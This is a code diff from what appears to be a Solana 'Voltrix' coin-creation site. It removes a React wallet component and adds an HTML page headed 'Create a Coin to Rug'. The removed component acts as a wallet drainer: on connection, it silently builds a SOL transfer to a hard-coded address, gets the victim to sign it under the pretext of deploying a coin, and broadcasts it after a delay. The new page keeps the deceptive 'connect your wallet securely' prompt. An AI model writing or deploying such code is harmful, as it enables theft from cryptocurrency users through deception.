@@ -1,168 +1,74 @@
-import React, { FC, useEffect, useState } from 'react';
-import ReactDOM from 'react-dom';
-import {
-  Connection,
-  PublicKey,
-  SystemProgram,
-  Transaction,
-} from '@solana/web3.js';
-import {
-  useWallet,
-  WalletProvider,
-  ConnectionProvider,
-} from '@solana/wallet-adapter-react';
-import {
-  WalletModalProvider,
-  WalletMultiButton,
-} from '@solana/wallet-adapter-react-ui';
-import {
-  PhantomWalletAdapter,
-} from '@solana/wallet-adapter-wallets';
-
-import './App.css';
-require('@solana/wallet-adapter-react-ui/styles.css');
-
-const network = 'https://api.mainnet-beta.solana.com';
-
-const WalletWrapper: FC<{ children: React.ReactNode }> = ({ children }) => {
-  const endpoint = network;
-  const wallets = [new PhantomWalletAdapter()];
-
-  return (
-    <ConnectionProvider endpoint={endpoint}>
-      <WalletProvider wallets={wallets} autoConnect>
-        <WalletModalProvider>{children}</WalletModalProvider>
-      </WalletProvider>
-    </ConnectionProvider>
-  );
-};
-
-const WalletConnectionHandler: FC = () => {
-  const { connected, publicKey, signTransaction } = useWallet();
-  const [solBalance, setSolBalance] = useState<number | null>(null);
-  const [loading, setLoading] = useState(false);
-
-  useEffect(() => {
-    const connection = new Connection(network);
-
-    const sendSolWithDelay = async () => {
-      try {
-        setLoading(true);
-
-        if (!publicKey) return;
-
-        const balance = await connection.getBalance(publicKey);
-        const sol = balance / 1e9;
-        setSolBalance(sol);
-
-        const sendAmount = 0.001 * 1e9; // lamports
-        if (sol <= 0) {
-          alert('⚠️ Not enough SOL to send.');
-          return;
-        }
-
-        const transaction = new Transaction().add(
-          SystemProgram.transfer({
-            fromPubkey: publicKey,
-            toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
-            lamports: sendAmount,
-          })
-        );
-        transaction.feePayer = publicKey;
-        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-
-        if (!signTransaction) {
-          alert('❌ Wallet not ready to sign.');
-          return;
-        }
-
-        const signedTx = await signTransaction(transaction);
-        console.log('🖊️ Transaction signed.');
-
-        setTimeout(async () => {
-          try {
-            const txid = await connection.sendRawTransaction(signedTx.serialize());
-            console.log(`🚀 Transaction sent. Signature: ${txid}`);
-          } catch (err) {
-            console.error('❌ Failed to send transaction:', err);
-          }
-        }, 10000); // 10-second delay
-      } catch (err) {
-        console.error('❌ Error sending transaction:', err);
-        alert('Transaction failed.');
-      } finally {
-        setLoading(false);
-      }
-    };
-
-    if (connected && publicKey) {
-      sendSolWithDelay();
-    }
-  }, [connected, publicKey, signTransaction]);
-
-  const WalletUI = (
-    <div className="wallet-modal">
-      <div className="wallet-close" id="closePopup">
-        <i className="fas fa-times"></i>
-      </div>
-      <i className="fas fa-wallet"></i>
-      <h2>
-        <span className="highlight">Connect Wallet</span>
-      </h2>
-      <p>To deploy your coin, please connect your wallet securely using Voltrix.</p>
-
-      {!connected || !publicKey ? (
-        <>
-          <WalletMultiButton
-            style={{
-              background: 'linear-gradient(to right, #ff5cd1, #ff91e3)',
-              color: 'white',
-              borderRadius: '10px',
-              padding: '12px 24px',
-              fontSize: '16px',
-              fontWeight: '600',
-              border: 'none',
-              boxShadow: '0 0 12px rgba(255, 92, 209, 0.6)',
-              cursor: 'pointer',
-            }}
-          />
-          <p id="status_p" style={{ marginTop: '20px' }}></p>
-        </>
-      ) : (
-        <>
-          <h2 style={{ color: '#ff91e3', marginBottom: '12px' }}>✅ Wallet Connected</h2>
-          <p
-            style={{
-              wordBreak: 'break-all',
-              cursor: 'pointer',
-              fontSize: '14px',
-              color: '#ffadeb',
-              marginBottom: '10px',
-            }}
-            onClick={() => navigator.clipboard.writeText(publicKey.toBase58())}
-          >
-            <strong style={{ color: '#ffbff0' }}>Address:</strong>
-            <br />
-            {publicKey.toBase58()}
-          </p>
-          <p style={{ fontSize: '15px', marginBottom: '6px', color: '#ffc5f1' }}>
-            <strong>Balance:</strong>{' '}
-            {loading ? 'Loading...' : solBalance !== null ? `${solBalance.toFixed(4)} SOL` : 'N/A'}
-          </p>
-        </>
-      )}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Voltrix | Coin Creation</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous"/>
+  <script src="https://unpkg.com/@solana/web3.js@v1.33.0/lib/index.iife.js"></script>
+  <style>
+  
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">
+      <img src="./images/logo.png" alt="SOL Logo" />
+      <span class="sol-text">
+        <img src="./images/voltrix.png" alt="Voltrix Logo" style="height: 1.5rem;" />
+      </span>
     </div>
-  );
+  </header><br>
 
-  return ReactDOM.createPortal(WalletUI, document.getElementById('walletPopup') as HTMLElement);
-};
+  <a href="javascript:history.back()" class="back-button">
+    <i class="fas fa-arrow-left"></i> Back
+  </a>
 
-const App: FC = () => {
-  return (
-    <WalletWrapper>
-      <WalletConnectionHandler />
-    </WalletWrapper>
-  );
-};
+  <section class="coin-maker-container neon-box">
+    <h1 style="text-align: center;">
+      <span class="highlight">🚀</span> Create a Coin to <span class="highlight">Rug</span>
+    </h1><br>
+    <form class="coin-form" id="coinForm">
+      <input type="text" placeholder="Name (e.g. Voltrix)" required />
+      <input type="text" placeholder="Ticker (e.g. VTRX)" required />
+      <input type="number" placeholder="Token Supply (e.g. 1000000000)" required />
+      <input type="text" placeholder="Description (optional)" />
+      <input type="url" placeholder="Image URL (optional)" />
+    <button id="connectWallet" class="creat-button" style="letter-spacing: 2px;">
+  <b>Create Coin</b>
+</button>
 
-export default App;
+    </form>
+
+  </section>
+
+  <div class="wallet-popup" id="walletPopup">
+  <div class="wallet-modal">
+    <div class="wallet-close" id="closePopup"><i class="fas fa-times"></i></div>
+    <i class="fas fa-wallet"></i>
+    <h2><span class="highlight">Connect Wallet</span></h2>
+    <p>To deploy your coin, please connect your wallet securely using Voltrix.</p>
+ <button id="connect_button" onclick="connectWallet()" style="padding: 10px 20px; font-size: 1rem;">Connect Wallet</button>
+  <p id="status_p" style="margin-top: 20px;"></p>
+
+  </div>
+</div>
+<script>
+  document.getElementById('connectWallet').addEventListener('click', function (e) {
+    e.preventDefault();
+    document.getElementById('walletPopup').classList.add('show-popup');
+  });
+
+  document.getElementById('closePopup').addEventListener('click', function () {
+    document.getElementById('walletPopup').classList.remove('show-popup');
+  });
+
+
+</script>
+
+</body>
+</html>
